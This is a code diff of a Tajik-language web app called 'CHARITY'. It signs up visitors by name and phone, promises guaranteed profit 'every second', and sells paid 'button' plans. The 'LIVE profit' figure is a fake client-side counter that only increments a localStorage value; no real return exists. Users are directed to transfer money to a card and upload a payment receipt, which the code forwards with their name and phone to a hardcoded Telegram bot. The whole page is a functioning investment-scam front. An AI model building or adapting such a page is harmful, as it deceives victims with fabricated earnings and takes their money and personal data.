@@ -3,78 +3,54 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CHARITY | Helping Hands</title>
+    <title>CHARITY | Боварии Шумо</title>
     <style>
         :root { --gold: #ffcc00; --dark: #070b14; --card: #151c2c; --green: #00ff88; --text-gray: #94a3b8; }
-        body { margin: 0; padding: 0; font-family: 'Segoe UI', Roboto, sans-serif; background: var(--dark); color: white; overflow-x: hidden; }
-        
-        .page { display: none; padding: 20px; padding-bottom: 100px; animation: slideUp 0.3s ease-out; }
+        body { margin: 0; padding: 0; font-family: 'Segoe UI', sans-serif; background: var(--dark); color: white; }
+        .page { display: none; padding: 20px; padding-bottom: 100px; animation: fadeIn 0.3s; }
         .active-page { display: block; }
-        @keyframes slideUp { from { transform: translateY(20px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
-
-        /* Дизайни кортҳо */
-        .glass-card { background: var(--card); border-radius: 20px; padding: 20px; border: 1px solid #2d3748; margin-bottom: 20px; box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.5); }
-        .btn-main { background: linear-gradient(45deg, var(--gold), #ffaa00); color: black; padding: 15px; border: none; border-radius: 12px; font-weight: bold; cursor: pointer; width: 100%; font-size: 16px; transition: 0.2s; }
-        .btn-main:active { transform: scale(0.98); }
-
-        /* VIP Buttons Style */
-        .vip-item { display: flex; justify-content: space-between; align-items: center; background: #1e293b; padding: 20px; border-radius: 15px; margin-bottom: 15px; border-left: 4px solid var(--gold); cursor: pointer; }
-        .vip-item h3 { margin: 0; color: var(--gold); }
-        
-        /* Navigation */
-        .nav { position: fixed; bottom: 0; width: 100%; background: rgba(15, 23, 42, 0.95); backdrop-filter: blur(10px); display: flex; justify-content: space-around; padding: 12px 0; border-top: 1px solid #1e293b; z-index: 1000; }
-        .nav-item { color: var(--text-gray); text-align: center; font-size: 10px; cursor: pointer; flex: 1; }
-        .nav-item i { font-size: 20px; display: block; margin-bottom: 4px; }
-        .active-nav { color: var(--gold); font-weight: bold; }
-
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+        .glass-card { background: var(--card); border-radius: 20px; padding: 20px; border: 1px solid #2d3748; margin-bottom: 20px; }
+        .btn-main { background: linear-gradient(45deg, var(--gold), #ffaa00); color: black; padding: 15px; border: none; border-radius: 12px; font-weight: bold; width: 100%; cursor: pointer; }
+        .vip-item { display: flex; justify-content: space-between; align-items: center; background: #1e293b; padding: 18px; border-radius: 15px; margin-bottom: 12px; border-left: 4px solid var(--gold); }
+        .nav { position: fixed; bottom: 0; width: 100%; background: #0f172a; display: flex; justify-content: space-around; padding: 12px 0; border-top: 1px solid #1e293b; }
+        .nav-item { color: var(--text-gray); text-align: center; font-size: 11px; flex: 1; }
+        .active-nav { color: var(--gold); }
         input { width: 100%; padding: 14px; margin: 10px 0; border-radius: 10px; border: 1px solid #2d3748; background: #0f172a; color: white; box-sizing: border-box; }
-        .badge { background: var(--gold); color: black; padding: 2px 8px; border-radius: 5px; font-size: 12px; font-weight: bold; }
     </style>
 </head>
 <body>
 
 <div id="page-reg" class="page">
-    <div style="text-align: center; margin-top: 60px;">
-        <img src="https://i.ibb.co/LzNfS6P/charity-logo.png" style="width: 120px; border-radius: 50%; box-shadow: 0 0 20px var(--gold);">
-        <h1 style="color: var(--gold); letter-spacing: 2px; margin-top: 20px;">CHARITY</h1>
-        <p style="color: var(--text-gray);">Барои ворид шудан маълумотро пур кунед</p>
+    <div style="text-align: center; margin-top: 50px;">
+        <h1 style="color: var(--gold);">CHARITY</h1>
+        <p>Барои оғоз ворид шавед</p>
         <div class="glass-card">
             <input type="text" id="reg-name" placeholder="Номи шумо">
-            <input type="tel" id="reg-phone" placeholder="Рақами телефон (9XXXXXXXX)">
+            <input type="tel" id="reg-phone" placeholder="Телефон">
             <button class="btn-main" onclick="register()">ВОРИД ШУДАН</button>
         </div>
     </div>
 </div>
 
 <div id="page-home" class="page">
-    <div class="glass-card" style="border-color: var(--gold);">
-        <h2 style="margin-top:0">Эътимод ва Кафолат 🤝</h2>
-        <p style="line-height: 1.6; color: #cbd5e1;">Мо ба шумо кафолати <b>1-солаи</b> фаъолияти боэътимодро медиҳем. Маблағҳои хайриявии шумо таҳти назорати қатъӣ қарор доранд ва фоидаи шумо ҳар сония илова мешавад.</p>
-        <div style="display: flex; gap: 10px; margin-top: 15px;">
-            <div style="flex:1; background: #064e3b; padding: 10px; border-radius: 10px; text-align: center;">
-                <span style="display:block; font-size: 12px;">Устуворӣ</span>
-                <b style="color: var(--green);">100%</b>
-            </div>
-            <div style="flex:1; background: #1e3a8a; padding: 10px; border-radius: 10px; text-align: center;">
-                <span style="display:block; font-size: 12px;">Дастгирӣ</span>
-                <b>24/7</b>
-            </div>
-        </div>
+    <div class="glass-card" style="border: 1px solid var(--gold);">
+        <h2 style="margin-top:0">Кафолати 100% 🛡️</h2>
+        <p style="font-size: 14px; color: #cbd5e1;">Мо кафолат медиҳем, ки системаи CHARITY то як соли оянда бетанаффус кор мекунад. Маблағҳои шумо дар амон ҳастанд ва фоидаи шумо ҳар сония илова мешавад. Мо барои эътимоди шумо ҷавобгӯ ҳастем!</p>
     </div>
 
     <div class="glass-card" style="text-align: center;">
-        <span style="color: var(--text-gray); font-size: 14px;">Фоидаи ҷории шумо (LIVE):</span>
-        <h1 id="live-profit" style="font-size: 42px; margin: 10px 0; color: var(--green);">0.0000</h1>
-        <div id="active-status" style="color: var(--gold); font-size: 13px; font-weight: bold;">Нақшаи фаъол нест</div>
+        <span style="color: var(--text-gray);">Фоидаи LIVE:</span>
+        <h1 id="live-profit" style="font-size: 40px; color: var(--green); margin: 10px 0;">0.0000</h1>
+        <div id="active-status" style="color: var(--gold); font-weight: bold;">Нақша фаъол нест</div>
     </div>
 
     <div class="glass-card">
         <h3>Пур кардани Баланс</h3>
-        <p style="font-size: 13px; color: var(--text-gray);">Маблағро ба корти зерин гузаронед ва чекро фиристед:</p>
-        <div style="background: #000; padding: 15px; border-radius: 12px; text-align: center; font-size: 18px; border: 1px dashed var(--gold); letter-spacing: 1px;">4444 5555 6666 7777</div>
-        <p style="font-size: 12px; margin-top: 15px;">Интихоби чек (сурат):</p>
-        <input type="file" id="check-file" accept="image/*" style="padding: 10px;">
-        <button class="btn-main" onclick="sendToTelegram()">ФИРИСТОДАН БА АДМИН</button>
+        <p style="font-size: 12px; color: var(--text-gray);">Корти Миллӣ барои гузаронидан:</p>
+        <div style="background: #000; padding: 12px; border-radius: 10px; text-align: center; font-weight: bold;">4444 5555 6666 7777</div>
+        <input type="file" id="check-file" accept="image/*" style="margin-top:15px;">
+        <button id="send-btn" class="btn-main" onclick="sendToTelegram()">ФИРИСТОДАНИ ЧЕК</button>
     </div>
 </div>
 
@@ -84,25 +60,25 @@
 </div>
 
 <div id="page-details" class="page">
-    <button onclick="showPage('products')" style="background:none; border:none; color:var(--gold); font-size:16px; margin-bottom:20px;">← Бозгашт</button>
+    <button onclick="showPage('products')" style="background:none; border:none; color:var(--gold); margin-bottom:15px;">← Бозгашт</button>
     <div id="details-content"></div>
 </div>
 
 <div id="page-profile" class="page">
     <div class="glass-card" style="text-align: center;">
-        <div id="user-avatar" style="width: 80px; height: 80px; background: var(--gold); color: black; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 30px; font-weight: bold; margin: 0 auto 15px;">U</div>
-        <h2 id="profile-name" style="margin:0">Корбар</h2>
-        <p id="profile-phone" style="color: var(--text-gray); margin: 5px 0 20px;">900 00 00 00</p>
-        <button class="btn-main" style="background: #24292f; color: white;" onclick="window.location.href='https://t.me/charity_tj'">💬 ГУРӮҲИ ТЕЛЕГРАМ</button>
+        <div style="width:70px; height:70px; background:var(--gold); border-radius:50%; margin:0 auto 10px; display:flex; align-items:center; justify-content:center; color:black; font-size:24px; font-weight:bold;" id="u-icon">U</div>
+        <h2 id="p-name">Корбар</h2>
+        <p id="p-phone" style="color:var(--text-gray)"></p>
+        <button class="btn-main" onclick="window.open('https://t.me/charity_tj', '_blank')" style="background:#24292f; color:white;">💬 ГУРӮҲИ ТЕЛЕГРАМ</button>
         <br><br>
-        <button onclick="logout()" style="color: #ef4444; background: none; border: none; cursor: pointer;">ХУРУҶ АЗ АККАУНТ</button>
+        <button onclick="logout()" style="color:#ef4444; background:none; border:none;">Хуруҷ</button>
     </div>
 </div>
 
 <nav id="nav-bar" class="nav" style="display:none;">
-    <div class="nav-item active-nav" onclick="tabClick(this, 'home')">🏠<br>Асосӣ</div>
-    <div class="nav-item" onclick="tabClick(this, 'products')">🔘<br>Тугмаҳо</div>
-    <div class="nav-item" onclick="tabClick(this, 'profile')">👤<br>Профил</div>
+    <div class="nav-item active-nav" onclick="tab(this, 'home')">🏠<br>Асосӣ</div>
+    <div class="nav-item" onclick="tab(this, 'products')">🔘<br>Тугмаҳо</div>
+    <div class="nav-item" onclick="tab(this, 'profile')">👤<br>Профил</div>
 </nav>
 
 <script>
@@ -110,47 +86,44 @@
     const CHAT_ID = "6365005853";
 
     const vips = [
-        { id: 1, name: 'Тугмаи 1', price: 120, day: 3, desc: 'Ин нақша барои навкорон беҳтарин аст. Бо маблағи кам даромади доимиро оғоз кунед.' },
-        { id: 2, name: 'Тугмаи 2', price: 260, day: 6, desc: 'Нақшаи миёна бо фоидаи дучанд. Суръати афзоиши маблағ тезтар аст.' },
-        { id: 3, name: 'Тугмаи 3', price: 470, day: 15, desc: 'Нақшаи касбӣ барои онҳое, ки мехоҳанд фоидаи калон ба даст оранд.' }
+        { id:1, name:'Тугмаи 1', price:120, day:3, desc:'Оғози осон барои ҳама. Фоидаи устувор.' },
+        { id:2, name:'Тугмаи 2', price:260, day:6, desc:'Нақшаи миёна барои даромади бештар.' },
+        { id:3, name:'Тугмаи 3', price:470, day:15, desc:'Нақшаи VIP бо суръати баланди даромад.' }
     ];
 
-    let user = JSON.parse(localStorage.getItem('charity_user'));
-    let activePlan = JSON.parse(localStorage.getItem('charity_plan'));
-    let liveVal = parseFloat(localStorage.getItem('charity_balance')) || 0;
+    let user = JSON.parse(localStorage.getItem('charity_u'));
+    let activePlan = JSON.parse(localStorage.getItem('charity_p'));
+    let balance = parseFloat(localStorage.getItem('charity_b')) || 0;
 
     window.onload = () => {
-        if(user) {
-            startApp();
-        } else {
-            showPage('reg');
-        }
+        if(user) startApp(); else showPage('reg');
     };
 
     function register() {
         const name = document.getElementById('reg-name').value;
         const phone = document.getElementById('reg-phone').value;
-        if(name.length > 2 && phone.length > 5) {
+        if(name && phone) {
             user = { name, phone };
-            localStorage.setItem('charity_user', JSON.stringify(user));
+            localStorage.setItem('charity_u', JSON.stringify(user));
             startApp();
-        } else { alert("Маълумотро дуруст пур кунед!"); }
+        }
     }
 
     function startApp() {
-        document.getElementById('page-reg').style.display = 'none';
-        document.getElementById('nav-bar').style.display = 'flex';
-        document.getElementById('profile-name').innerText = user.name;
-        document.getElementById('profile-phone').innerText = user.phone;
-        document.getElementById('user-avatar').innerText = user.name[0].toUpperCase();
+        document.getElementById('page-reg').style.display='none';
+        document.getElementById('nav-bar').style.display='flex';
+        document.getElementById('p-name').innerText = user.name;
+        document.getElementById('p-phone').innerText = user.phone;
+        document.getElementById('u-icon').innerText = user.name[0].toUpperCase();
         showPage('home');
         renderVIPs();
+        if(activePlan) document.getElementById('active-status').innerText = "Фаъол: " + activePlan.name;
         
         setInterval(() => {
             if(activePlan) {
-                liveVal += (activePlan.day / 86400);
-                document.getElementById('live-profit').innerText = liveVal.toFixed(4);
-                localStorage.setItem('charity_balance', liveVal);
+                balance += (activePlan.day / 86400);
+                document.getElementById('live-profit').innerText = balance.toFixed(4);
+                localStorage.setItem('charity_b', balance);
             }
         }, 1000);
     }
@@ -159,86 +132,78 @@
         const list = document.getElementById('vip-list');
         list.innerHTML = '';
         vips.forEach(v => {
-            list.innerHTML += `
-                <div class="vip-item" onclick="showDetails(${v.id})">
-                    <div>
-                        <h3>${v.name}</h3>
-                        <span style="color:var(--text-gray)">Нарх: ${v.price} TJS</span>
-                    </div>
-                    <span class="badge">ДИДАН</span>
-                </div>`;
+            list.innerHTML += `<div class="vip-item" onclick="showDetails(${v.id})">
+                <div><b>${v.name}</b><br><small>${v.price} TJS</small></div>
+                <button style="background:var(--gold); border:none; border-radius:5px; padding:5px 10px;">ДИДАН</button>
+            </div>`;
         });
     }
 
     function showDetails(id) {
         const v = vips.find(x => x.id === id);
-        const content = document.getElementById('details-content');
-        content.innerHTML = `
-            <div class="glass-card" style="border-top: 5px solid var(--gold);">
-                <h1 style="color:var(--gold)">${v.name}</h1>
-                <p style="color:var(--text-gray); line-height:1.5">${v.desc}</p>
-                <hr style="border:0; border-top:1px solid #2d3748; margin:20px 0;">
-                <div style="display:grid; grid-template-columns: 1fr 1fr; gap:15px; margin-bottom:20px;">
-                    <div>📅 Ҳар рӯз:<br><b style="color:var(--green)">${v.day} TJS</b></div>
-                    <div>📊 10 рӯз:<br><b style="color:var(--green)">${v.day * 10} TJS</b></div>
-                    <div>💰 Як моҳ:<br><b style="color:var(--green)">${v.day * 30} TJS</b></div>
-                    <div>🏦 Нарх:<br><b>${v.price} TJS</b></div>
+        document.getElementById('details-content').innerHTML = `
+            <div class="glass-card">
+                <h2 style="color:var(--gold)">${v.name}</h2>
+                <p>${v.desc}</p>
+                <div style="display:grid; grid-template-columns:1fr 1fr; gap:10px; margin:15px 0;">
+                    <div class="glass-card" style="padding:10px; margin:0">10 рӯз:<br><b style="color:var(--green)">${v.day*10} TJS</b></div>
+                    <div class="glass-card" style="padding:10px; margin:0">1 моҳ:<br><b style="color:var(--green)">${v.day*30} TJS</b></div>
                 </div>
-                <button class="btn-main" onclick="activatePlan(${v.id})">ИНТИХОБ ВА ФАЪОЛ КАРДАН</button>
-            </div>
-        `;
+                <button class="btn-main" onclick="activate(${v.id})">ИНТИХОБ КАРДАН</button>
+            </div>`;
         showPage('details');
     }
 
-    function activatePlan(id) {
+    function activate(id) {
         const v = vips.find(x => x.id === id);
         activePlan = v;
-        localStorage.setItem('charity_plan', JSON.stringify(v));
+        localStorage.setItem('charity_p', JSON.stringify(v));
         document.getElementById('active-status').innerText = "Фаъол: " + v.name;
         showPage('home');
-        alert("Нақшаи " + v.name + " интихоб шуд. Лутфан чеки пардохтро фиристед.");
+        alert("Нақша интихоб шуд! Акнун чекро фиристед.");
     }
 
     async function sendToTelegram() {
-        const fileInput = document.getElementById('check-file');
-        if (!fileInput.files[0]) return alert("Лутфан аввал сурати чекро бор кунед!");
-
-        const btn = document.querySelector('button[onclick="sendToTelegram()"]');
+        const file = document.getElementById('check-file').files[0];
+        if(!file) return alert("Аввал суратро интихоб кунед!");
+        
+        const btn = document.getElementById('send-btn');
         btn.innerText = "ФИРИСТОДА ИСТОДААСТ...";
         btn.disabled = true;
 
         const formData = new FormData();
         formData.append("chat_id", CHAT_ID);
-        formData.append("photo", fileInput.files[0]);
-        formData.append("caption", `📥 ЧЕКИ НАВ!\n👤 Ном: ${user.name}\n📞 Тел: ${user.phone}\n💳 Нақша: ${activePlan ? activePlan.name : 'Интихоб нашуда'}`);
+        formData.append("photo", file);
+        formData.append("caption", `💰 ЧЕКИ НАВ\n👤 Ном: ${user.name}\n📞 Тел: ${user.phone}\n📊 Нақша: ${activePlan ? activePlan.name : 'Интихоб нашуда'}`);
 
         try {
-            const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: formData });
-            if(res.ok) {
-                alert("✅ Чеки шумо фиристода шуд! Админ пас аз тафтиш баланси шуморо тасдиқ мекунад.");
-                btn.innerText = "ФИРИСТОДА ШУД ✅";
-            } else { alert("Хатогӣ дар бот! Ботро дар Телеграм START кардед?"); btn.disabled = false; }
-        } catch (e) { alert("Хатогии шабака!"); btn.disabled = false; }
+            const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: formData });
+            if(r.ok) {
+                alert("✅ Чек бо муваффақият ба админ фиристода шуд!");
+                btn.innerText = "ФИРИСТОДА ШУД";
+            } else {
+                alert("❌ Хатогӣ дар бот. Ботро дар Телеграм як бор СТАРТ кунед: @charity_admin_boy_bot");
+                btn.disabled = false;
+                btn.innerText = "ФИРИСТОДАН БА АДМИН";
+            }
+        } catch(e) {
+            alert("🌐 Хатогии интернет!");
+            btn.disabled = false;
+        }
     }
 
     function showPage(p) {
-        document.querySelectorAll('.page').forEach(pg => pg.classList.remove('active-page'));
+        document.querySelectorAll('.page').forEach(x => x.classList.remove('active-page'));
         document.getElementById('page-'+p).classList.add('active-page');
-        window.scrollTo(0,0);
     }
 
-    function tabClick(el, p) {
-        document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active-nav'));
+    function tab(el, p) {
+        document.querySelectorAll('.nav-item').forEach(x => x.classList.remove('active-nav'));
         el.classList.add('active-nav');
         showPage(p);
     }
 
-    function logout() {
-        if(confirm("Оё мехоҳед аз аккаунт бароед?")) {
-            localStorage.clear();
-            location.reload();
-        }
-    }
+    function logout() { localStorage.clear(); location.reload(); }
 </script>
 </body>
 </html>
